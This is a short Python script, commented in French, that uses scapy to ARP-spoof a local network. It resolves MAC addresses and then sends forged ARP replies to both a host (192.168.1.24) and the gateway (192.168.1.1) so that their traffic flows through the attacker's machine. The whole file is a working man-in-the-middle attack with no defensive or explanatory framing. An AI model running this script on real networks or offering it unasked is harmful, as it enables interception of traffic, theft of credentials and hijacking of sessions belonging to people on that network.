# -*- coding: utf-8 -*-

import scapy.all as scapy
from scapy.layers.l2 import Ether, ARP

def get_mac(target_ip):
    try:
        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=target_ip) # broadcast MAC
        scapy.srp(arp_request, timeout=1, verbose=False)[0][0][1].hwsrc # envoie et récupère la réponse (liste de 2 listes)
        mac = scapy.srp(arp_request, timeout=1, verbose=False)[0][0][1].hwsrc
    except Exception as e:
        print(str(e))    
    return mac

def arp_spoof(target_ip, target_mac, ip_source):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=ip_source) # réponse IP cible
    scapy.send(packet)


arp_spoof("192.168.1.24", get_mac("192.168.1.24"), "192.168.1.1")
arp_spoof("192.168.1.1", get_mac("192.168.1.1"), "192.168.1.24")
#arp_spoof("192.168.1.1")     